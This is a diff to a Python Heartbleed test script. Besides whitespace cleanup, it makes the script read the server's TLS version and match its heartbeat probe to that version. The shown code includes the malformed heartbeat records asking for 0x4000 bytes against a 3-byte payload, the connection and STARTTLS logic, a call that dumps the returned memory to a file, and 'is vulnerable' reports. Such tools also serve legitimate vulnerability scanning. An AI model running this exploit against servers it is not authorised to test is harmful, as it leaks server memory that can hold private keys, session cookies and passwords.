@@ -39,19 +39,19 @@ c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11
 00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08
 00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13
 00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00
-00 0f 00 01 01                                  
+00 0f 00 01 01
 ''')
 
 hbv10 = h2bin('''
 18 03 01 00 03
 01 40 00
 ''')
- 
+
 hbv11 = h2bin('''
 18 03 02 00 03
 01 40 00
 ''')
- 
+
 hbv12 = h2bin('''
 18 03 03 00 03
 01 40 00
@@ -74,7 +74,7 @@ def recvall(s, length, timeout=5):
 	rdata = ''
 	remain = length
 	while remain > 0:
-		rtime = endtime - time.time() 
+		rtime = endtime - time.time()
 		if rtime < 0:
 			return None
 		r, w, e = select.select([s], [], [], 5)
@@ -86,7 +86,7 @@ def recvall(s, length, timeout=5):
 			rdata += data
 			remain -= len(data)
 	return rdata
-		
+
 
 def recvmsg(s):
 	hdr = recvall(s, 5)
@@ -142,10 +142,10 @@ def parseresp(s):
 		typ, ver, pay = recvmsg(s)
 		if typ == None:
 			print 'Server closed connection without sending Server Hello.'
-			return False
+			return 0
 		# Look for server hello done message.
 		if typ == 22 and ord(pay[0]) == 0x0E:
-			return True
+			return ver
 
 def check(host, port, version, dumpf, quiet, starttls):
 	response = False
@@ -160,7 +160,7 @@ def check(host, port, version, dumpf, quiet, starttls):
 			sys.exit(0)
 		print 'STARTTLS supported...'
 		s.quit()
-		s = connect(host, port, quiet)	
+		s = connect(host, port, quiet)
 		s.settimeout(1)
 		try:
 			re = s.recv(1024)
@@ -172,11 +172,19 @@ def check(host, port, version, dumpf, quiet, starttls):
 			print 'Timeout issues, going ahead anyway, but it is probably broken ...'
 		tls(s,quiet)
 	else:
-		s = connect(host, port, quiet)	
+		s = connect(host, port, quiet)
 		tls(s,quiet)
 
-	if not parseresp(s):
+	serverversion = parseresp(s)
+
+	if serverversion == 0:
+		print "Got 0 from parseresp"
 		return
+	else:
+		serverversion = serverversion - 0x0300
+		print "Our version was %d, server version was %d\n" % (version, serverversion)
+		version = serverversion
+
 	if not quiet: print 'Sending heartbeat request...'
 	sys.stdout.flush()
 	if (version == 1):
@@ -190,7 +198,7 @@ def check(host, port, version, dumpf, quiet, starttls):
 		response = hit_hb(s,dumpf, host, quiet)
 	s.close()
 	return response
-	
+
 def main():
 	opts, args = options.parse_args()
 	if len(args) < 1:
@@ -210,7 +218,7 @@ def main():
 			if two: print 'TLS v1.1 on '+ args[0] +' is vulnerable'
 			if three: print 'TLS v1.2 on '+ args[0] +' is vulnerable'
 		else:
-			check(args[0], opts.port, opts.ver, opts.file, opts.quiet, opts.starttls)	
+			check(args[0], opts.port, opts.ver, opts.file, opts.quiet, opts.starttls)
 
 if __name__ == '__main__':
 	main()
